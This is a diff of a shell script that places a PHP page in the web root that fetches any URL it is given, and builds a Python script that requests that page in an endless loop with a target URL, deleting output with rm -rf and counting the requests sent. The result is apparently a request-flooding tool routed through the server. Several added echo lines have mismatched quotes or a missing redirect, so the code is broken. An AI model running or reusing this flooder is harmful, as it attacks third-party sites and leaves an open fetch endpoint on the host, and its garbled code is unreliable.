@@ -29,6 +29,8 @@ else
         echo "Unknown OS"
 fi
 
+touch /var/www/html/url.php
+touch /var/www/html/send.py
 
 echo "<?php file_get_contents(\$_GET['url']);" > /var/www/html/url.php
 
@@ -37,6 +39,9 @@ echo "import ipgetter" >> /var/www/html/send.py
 echo "import sys" >> /var/www/html/send.py
 echo "ip = ipgetter.myip()" >> /var/www/html/send.py
 echo "url = sys.argv[1]" >> /var/www/html/send.py
+echo "count = 0" >> /var/www/html/send.py
 echo "while True:" >> /var/www/html/send.py
-echo "    os.system(\"wget http://%s/url.php?url=%s\" % (ip, url))" >> /var/www/html/send.py
-echo "    os.system(\"rm -rf url.php.*\")" >> /var/www/html/send.py
+echo "    count += 1"
+echo "    os.system(\"wget http://%s/url.php?url=%s\ >/dev/null 2>&1" % (ip, url))" >> /var/www/html/send.py
+echo "    os.system(\"rm -rf url.php?*\")" >> /var/www/html/send.py
+echo "    sys.stdout.write("Sent: {} Requests".format(count))
